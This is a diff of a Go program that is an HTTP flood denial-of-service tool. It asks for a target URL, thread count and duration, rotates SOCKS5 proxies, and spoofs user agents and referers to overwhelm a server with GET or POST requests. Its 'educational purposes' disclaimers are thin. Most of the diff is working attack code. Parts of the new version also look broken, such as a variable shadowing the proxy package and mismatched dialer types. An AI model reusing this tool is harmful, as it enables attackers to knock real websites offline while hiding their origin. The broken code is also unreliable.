@@ -7,26 +7,23 @@ import (
 	"io"
 	"math/rand"
 	"net"
+	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
-
-	"golang.org/x/net/proxy"
 )
 
 var (
-	host       = ""
-	port       = "80"
-	page       = ""
-	mode       = ""
-	abcd       = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
-	start      = make(chan bool)
-	acceptall  = []string{
+	host      = ""
+	port      = "80"
+	page      = ""
+	mode      = ""
+	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
+	start     = make(chan bool)
+	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
 		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -41,16 +38,15 @@ var (
 		"Accept: text/html, application/xhtml+xml",
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-	}
-	key        string
-	choice     = []string{"Macintosh", "Windows", "X11"}
-	choice2    = []string{"68K", "PPC", "Intel Mac OS X"}
-	choice3    = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
-	choice4    = []string{"Linux i686", "Linux x86_64"}
-	choice5    = []string{"chrome", "spider", "ie"}
-	choice6    = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
-	spider     = []string{
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
+	key     string
+	choice  = []string{"Macintosh", "Windows", "X11"}
+	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
+	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
+	choice4 = []string{"Linux i686", "Linux x86_64"}
+	choice5 = []string{"chrome", "spider", "ie"}
+	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
+	spider  = []string{
 		"AdsBot-Google ( http://www.google.com/adsbot.html)",
 		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
 		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
@@ -75,43 +71,25 @@ var (
 		"https://www.ted.com/search?q=",
 		"https://play.google.com/store/search?q=",
 	}
-	headerFile = "header.txt"
+	headerFile = "header.txt" // Default header file
 	proxies    []string
-	payloadKB  int
-	workers    int
-	requests   int
-	timeout    = 5 * time.Second
-	logMutex   sync.Mutex
-	success    int
-	failed     int
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-func clearTerminal() {
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "cls")
-	} else {
-		cmd = exec.Command("clear")
-	}
-	cmd.Stdout = os.Stdout
-	cmd.Run()
-}
-
 func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2))]
+		os = choice2[rand.Intn(len(choice2)-1)]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3))]
+		os = choice3[rand.Intn(len(choice3)-1)]
 	} else if platform == "X11" {
-		os = choice4[rand.Intn(len(choice4))]
+		os = choice4[rand.Intn(len(choice4)-1)]
 	}
-	browser := choice5[rand.Intn(len(choice5))]
+	browser := choice5[rand.Intn(len(choice5)-1)]
 	if browser == "chrome" {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
 		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
@@ -122,7 +100,7 @@ func getuseragent() string {
 		option := rand.Intn(1)
 		var token string
 		if option == 1 {
-			token = choice6[rand.Intn(len(choice6))] + "; "
+			token = choice6[rand.Intn(len(choice6)-1)] + "; "
 		} else {
 			token = ""
 		}
@@ -131,135 +109,139 @@ func getuseragent() string {
 	return spider[rand.Intn(len(spider))]
 }
 
-func loadProxies(file string) ([]string, error) {
-	f, err := os.Open(file)
-	if err != nil {
-		return nil, err
+func contain(char string, x string) int {
+	times := 0
+	ans := 0
+	for i := 0; i < len(char); i++ {
+		if char[times] == x[0] {
+			ans = 1
+		}
+		times++
 	}
-	defer f.Close()
-
-	var proxies []string
-	scanner := bufio.NewScanner(f)
-	for scanner.Scan() {
-		proxies = append(proxies, scanner.Text())
-	}
-	return proxies, nil
+	return ans
 }
 
-func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
+func flood(wg *sync.WaitGroup) {
 	defer wg.Done()
-
+	addr := host + ":" + port
+	header := ""
+	if mode == "get" {
+		header += " HTTP/1.1\r\nHost: "
+		header += addr + "\r\n"
+		if headerFile == "nil" {
+			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
+			header += acceptall[rand.Intn(len(acceptall))]
+			header += referers[rand.Intn(len(referers))] + "\r\n"
+		} else {
+			func() {
+				fi, err := os.Open(headerFile)
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
+				}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
+		}
+	} else if mode == "post" {
+		data := ""
+		if headerFile != "nil" {
+			func() {
+				fi, err := os.Open(headerFile)
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
+				}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
+		} else {
+			data = "f"
+		}
+		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
+	}
+	var s net.Conn
+	var err error
+	<-start
 	for {
-		select {
-		case <-timeoutChan:
-			return
-		default:
-			addr := host + ":" + port
-			header := ""
-			if mode == "get" {
-				header += "GET " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-				if headerFile == "nil" {
-					header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-					header += "User-Agent: " + getuseragent() + "\r\n"
-					header += acceptall[rand.Intn(len(acceptall))]
-					header += "Referer: " + referers[rand.Intn(len(referers))] + "\r\n"
-				} else {
-					func() {
-						fi, err := os.Open(headerFile)
-						if err != nil {
-							fmt.Printf("Error: %s\n", err)
-							return
-						}
-						defer fi.Close()
-						br := bufio.NewReader(fi)
-						for {
-							a, _, c := br.ReadLine()
-							if c == io.EOF {
-								break
-							}
-							header += string(a) + "\r\n"
-						}
-					}()
-				}
-			} else if mode == "post" {
-				data := strings.Repeat("a", payloadKB*1024)
-				header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-				header += "Connection: Keep-Alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
-				header += "Accept-Encoding: gzip, deflate\r\n\r\n" + data
+		proxy := proxies[rand.Intn(len(proxies))]
+		dialer, err := proxyDialer(proxy)
+		if err != nil {
+			fmt.Println("Error creating proxy dialer:", err)
+			continue
+		}
+		if port == "443" {
+			cfg := &tls.Config{
+				InsecureSkipVerify: true,
+				ServerName:         host,
 			}
-
-			var s net.Conn
-			var err error
-			<-start
-
-			if proxy != "" {
-				if strings.HasPrefix(proxy, "http") {
-					proxyURL, _ := url.Parse(proxy)
-					s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
-						InsecureSkipVerify: true,
-					})
-				} else if strings.HasPrefix(proxy, "socks5") {
-					// Поддержка SOCKS5 с авторизацией
-					proxyParts := strings.Split(proxy, "://")
-					if len(proxyParts) != 2 {
-						continue
-					}
-					authParts := strings.Split(proxyParts[1], "@")
-					var auth *proxy.Auth
-					if len(authParts) == 2 {
-						userPass := strings.Split(authParts[0], ":")
-						if len(userPass) == 2 {
-							auth = &proxy.Auth{
-								User:     userPass[0],
-								Password: userPass[1],
-							}
-						}
-						proxyParts[1] = authParts[1]
-					}
-					dialer, err := proxy.SOCKS5("tcp", proxyParts[1], auth, proxy.Direct)
-					if err != nil {
-						continue
-					}
-					s, err = dialer.Dial("tcp", addr)
+			s, err = tls.DialWithDialer(dialer, "tcp", addr, cfg)
+		} else {
+			s, err = dialer.Dial("tcp", addr)
+		}
+		if err != nil {
+			fmt.Println("Server went down")
+		} else {
+			for i := 0; i < 100; i++ {
+				request := ""
+				if mode == "get" {
+					request += "GET " + page + key
+					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
-			} else {
-				if port == "443" {
-					cfg := &tls.Config{
-						InsecureSkipVerify: true,
-						ServerName:         host,
-					}
-					s, err = tls.Dial("tcp", addr, cfg)
-				} else {
-					s, err = net.Dial("tcp", addr)
-				}
+				request += header + "\r\n"
+				s.Write([]byte(request))
 			}
-
-			if err != nil {
-				logMutex.Lock()
-				failed++
-				logMutex.Unlock()
-				continue
-			}
-
-			request := header + "\r\n"
-			s.Write([]byte(request))
-
-			logMutex.Lock()
-			success++
-			logMutex.Unlock()
-
 			s.Close()
 		}
 	}
 }
 
+func proxyDialer(proxy string) (*net.Dialer, error) {
+	proxyURL, err := url.Parse("socks5://" + proxy)
+	if err != nil {
+		return nil, err
+	}
+	dialer, err := proxy.FromURL(proxyURL, &net.Dialer{
+		Timeout:   30 * time.Second,
+		KeepAlive: 30 * time.Second,
+	})
+	if err != nil {
+		return nil, err
+	}
+	return dialer, nil
+}
+
+func loadProxies(filename string) error {
+	file, err := os.Open(filename)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		proxies = append(proxies, scanner.Text())
+	}
+	return scanner.Err()
+}
+
 func main() {
-	fmt.Println("\033[31mWARNING:\033[0m This tool is for educational and testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test. Misuse of this tool is illegal and unethical.")
-	fmt.Println("Press [Enter] to continue...")
-	bufio.NewReader(os.Stdin).ReadBytes('\n')
-
-	clearTerminal()
-
 	fmt.Println(`
     ____                   __  __    ___   __  __             __  
    / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__
@@ -268,8 +250,8 @@ func main() {
 /_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  
 `)
 
+	fmt.Println("Disclaimer: This code is for educational purposes only. Do not use it for malicious purposes.")
 	reader := bufio.NewReader(os.Stdin)
-
 	fmt.Print("Input the URL: ")
 	targetURL, _ := reader.ReadString('\n')
 	targetURL = strings.TrimSpace(targetURL)
@@ -287,7 +269,7 @@ func main() {
 	mode, _ = reader.ReadString('\n')
 	mode = strings.TrimSpace(mode)
 
-	fmt.Print("Input the time attack is going to last (in seconds): ")
+	fmt.Print("Input the time attack is going to last: ")
 	limitStr, _ := reader.ReadString('\n')
 	limitStr = strings.TrimSpace(limitStr)
 	limit, err := strconv.Atoi(limitStr)
@@ -300,42 +282,17 @@ func main() {
 	headerFile, _ = reader.ReadString('\n')
 	headerFile = strings.TrimSpace(headerFile)
 
-	fmt.Print("Input the payload size in KB: ")
-	payloadKBStr, _ := reader.ReadString('\n')
-	payloadKBStr = strings.TrimSpace(payloadKBStr)
-	payloadKB, err = strconv.Atoi(payloadKBStr)
-	if err != nil {
-		fmt.Println("Payload size should be an integer")
+	fmt.Print("Input the path to the SOCKS5 proxies file (socks5.txt): ")
+	proxyFile, _ := reader.ReadString('\n')
+	proxyFile = strings.TrimSpace(proxyFile)
+	if err := loadProxies(proxyFile); err != nil {
+		fmt.Println("Error loading proxies:", err)
 		return
-	}
-
-	fmt.Print("Input the number of requests per proxy: ")
-	requestsStr, _ := reader.ReadString('\n')
-	requestsStr = strings.TrimSpace(requestsStr)
-	requests, err = strconv.Atoi(requestsStr)
-	if err != nil {
-		fmt.Println("Requests should be an integer")
-		return
-	}
-
-	fmt.Print("Input the proxy type (http, https, socks4, socks5, or leave blank for no proxy): ")
-	proxyType, _ := reader.ReadString('\n')
-	proxyType = strings.TrimSpace(proxyType)
-
-	if proxyType != "" {
-		proxyFile := proxyType + ".txt"
-		proxies, err = loadProxies(proxyFile)
-		if err != nil {
-			fmt.Printf("Error loading proxies from %s: %s\n", proxyFile, err)
-			return
-		}
-	} else {
-		fmt.Println("\033[31mWARNING:\033[0m No proxies selected. Your IP address will be exposed. Use a VPN for anonymity.")
 	}
 
 	u, err := url.Parse(targetURL)
 	if err != nil {
-		fmt.Println("Invalid URL")
+		println("Please input a correct URL")
 		return
 	}
 	tmp := strings.Split(u.Host, ":")
@@ -349,27 +306,42 @@ func main() {
 		port = "80"
 	}
 	page = u.Path
-
-	if strings.Contains(page, "?") {
-		key = "&"
-	} else {
-		key = "?"
+	if mode != "get" && mode != "post" {
+		println("Wrong mode, Only can use \"get\" or \"post\"")
+		return
 	}
 
-	timeoutChan := time.After(time.Duration(limit) * time.Second)
+	if contain(page, "?") == 0 {
+		key = "?"
+	} else {
+		key = "&"
+	}
 
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
+		time.Sleep(time.Microsecond * 100)
 		wg.Add(1)
-		if len(proxies) > 0 {
-			go flood(proxies[i%len(proxies)], &wg, timeoutChan)
-		} else {
-			go flood("", &wg, timeoutChan)
-		}
+		go flood(&wg)
+		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+		os.Stdout.Sync()
+	}
+	fmt.Printf("\nPlease [Enter] to continue")
+	_, err = reader.ReadString('\n')
+	if err != nil {
+		fmt.Println(err)
+		return
 	}
 
-	close(start)
-	wg.Wait()
+	fmt.Println(`
+    ____                   __  __    ___   __  __             __  
+   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__
+  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/
+ / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   
+/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  
+`)
 
-	fmt.Printf("\nAttack completed. Success: %d, Failed: %d\n", success, failed)
+	fmt.Println("Flood will end in " + limitStr + " seconds.")
+	close(start)
+	time.Sleep(time.Duration(limit) * time.Second)
+	wg.Wait()
 }
